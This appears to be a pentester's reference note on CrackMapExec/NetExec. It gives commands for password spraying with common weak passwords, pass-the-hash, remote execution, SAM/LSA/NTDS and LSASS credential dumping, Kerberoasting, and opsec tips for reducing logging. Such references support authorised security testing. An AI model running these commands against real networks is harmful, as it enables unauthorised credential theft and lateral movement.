---
title: CrackMapExec (CME / NetExec)
tags: |-
  - tool
  - crackmapexec
  - CME
  - SMB
  - WinRM
  - AD
  - lateral-movement
  - post-exploitation
  - intermediate
category: exploitation
platform: Linux
install: pip install crackmapexec / apt install crackmapexec
created: 2026-03-26
updated: 2026-03-26
difficulty: intermediate
---

# 🗺️ CrackMapExec (CME)

## What It Is
CrackMapExec (CME) is a Swiss army knife for Windows/Active Directory networks. It automates assessment of large networks over SMB, WinRM, LDAP, SSH, and MSSQL. Used for credential spraying, pass-the-hash, lateral movement, and post-exploitation enumeration.

> **Note:** CrackMapExec has been largely superseded by **NetExec (nxc)** (a maintained fork). Both are nearly identical in syntax. Commands shown work for both.

## Installation
```bash
# Kali Linux
sudo apt install crackmapexec

# Via pip
pip3 install crackmapexec

# NetExec (maintained fork — preferred)
pip3 install netexec
# or: https://github.com/Pennyw0rth/NetExec

# Verify
crackmapexec --version
nxc --version
```

---

## Protocol Modules

CME supports: `smb`, `winrm`, `ldap`, `mssql`, `ssh`, `ftp`, `rdp`

---

## SMB Module

### Host Discovery & Authentication
```bash
# Scan subnet — find Windows hosts
crackmapexec smb 192.168.1.0/24

# Test credentials against a host
crackmapexec smb TARGET_IP -u username -p password

# Test against a range
crackmapexec smb 192.168.1.0/24 -u username -p password

# Pass-the-Hash
crackmapexec smb TARGET_IP -u username -H NTLM_HASH

# Null session
crackmapexec smb TARGET_IP -u '' -p ''
```

### Enumeration
```bash
# List shares
crackmapexec smb TARGET_IP -u user -p pass --shares

# List users (requires domain admin or specific perms)
crackmapexec smb TARGET_IP -u user -p pass --users

# List groups
crackmapexec smb TARGET_IP -u user -p pass --groups

# List logged-on users
crackmapexec smb TARGET_IP -u user -p pass --loggedon-users

# Check local admins
crackmapexec smb TARGET_IP -u user -p pass --local-auth --sam
```

### Execution
```bash
# Run a command (requires local admin)
crackmapexec smb TARGET_IP -u user -p pass -x "whoami"

# PowerShell command
crackmapexec smb TARGET_IP -u user -p pass -X "Get-Process"

# Execute a script
crackmapexec smb TARGET_IP -u user -p pass -X "$s=New-Object IO.MemoryStream(...)"
```

### Credential Dumping
```bash
# Dump SAM (local hashes)
crackmapexec smb TARGET_IP -u user -p pass --sam

# Dump LSA secrets
crackmapexec smb TARGET_IP -u user -p pass --lsa

# Dump NTDS (domain controller — DCSync equivalent)
crackmapexec smb DC_IP -u DomainAdmin -p pass --ntds
```

---

## WinRM Module

```bash
# Test WinRM access
crackmapexec winrm TARGET_IP -u user -p pass

# Run command
crackmapexec winrm TARGET_IP -u user -p pass -x "whoami"

# Pass-the-Hash
crackmapexec winrm TARGET_IP -u user -H NTLM_HASH
```

---

## LDAP Module

```bash
# Enumerate domain users
crackmapexec ldap DC_IP -u user -p pass --users

# Enumerate domain groups
crackmapexec ldap DC_IP -u user -p pass --groups

# Find Kerberoastable accounts
crackmapexec ldap DC_IP -u user -p pass --kerberoasting kerberoast.txt

# Find AS-REP roastable accounts
crackmapexec ldap DC_IP -u user -p pass --asreproast asrep.txt

# Password policy
crackmapexec ldap DC_IP -u user -p pass --pass-pol
```

---

## Password Spraying

> ⚠️ Observe lockout policy before spraying. Use `--pass-pol` to check threshold.

```bash
# Spray single password against user list
crackmapexec smb TARGET_IP -u users.txt -p 'Winter2024!' --continue-on-success

# Spray multiple passwords (careful — may lock accounts)
crackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# --no-bruteforce: pair user[0] with pass[0], user[1] with pass[1] (not all combinations)

# Common first passwords to try:
# Password1, Welcome1, Company123!, Season+Year (Winter2024, Spring2024)
# username as password, username+123
```

---

## CME Modules (--module flag)

```bash
# List available modules
crackmapexec smb --list-modules

# Mimikatz (dump credentials in memory)
crackmapexec smb TARGET_IP -u admin -p pass -M mimikatz

# Lsassy (in-memory LSASS dump without dropping Mimikatz)
crackmapexec smb TARGET_IP -u admin -p pass -M lsassy

# GPP passwords (Group Policy Preferences — plaintext passwords in SYSVOL)
crackmapexec smb DC_IP -u user -p pass -M gpp_password

# Check for MS17-010 (EternalBlue)
crackmapexec smb TARGET_IP -u '' -p '' -M ms17-010

# Spider shares for sensitive files
crackmapexec smb TARGET_IP -u user -p pass -M spider_plus
```

---

## Reading CME Output

```
SMB  192.168.1.10  445  WORKSTATION  [*] Windows 10.0 Build 19041 (name:WORKSTATION) (domain:CORP) (signing:False) (SMBv1:False)
SMB  192.168.1.10  445  WORKSTATION  [+] CORP\admin:Password1! (Pwn3d!)   ← Local admin!
SMB  192.168.1.10  445  WORKSTATION  [-] CORP\user:Password1! STATUS_LOGON_FAILURE

[*] = Informational
[+] = Success
[-] = Failure
(Pwn3d!) = Confirmed local admin access
```

---

## CME Database

CME stores results in a local database (`~/.cme/`):

```bash
# View credentials stored
cmedb
> creds          # List all credentials
> hosts          # List all hosts
> shares         # List shares
```

---

## Opsec Notes
> ⚠️ CME generates significant Windows event log noise. Each auth attempt = Event 4624/4625. SAM dump = Event 4657. Spray attacks are easily detectable by SIEM.
- Use `--local-auth` for local accounts (avoids DC logging)
- SMB signing: if `signing:True`, pass-the-hash relay attacks won't work
- Prefer targeted use over mass scanning in real engagements

---

## Related Notes
- Impacket
- BloodHound
- Active-Directory
- AD-Attack-Reference
- Evil-WinRM
- Hydra

## References
- CrackMapExec GitHub: https://github.com/byt3bl33d3r/CrackMapExec
- NetExec GitHub: https://github.com/Pennyw0rth/NetExec

---
<- [[Tools-MOC]]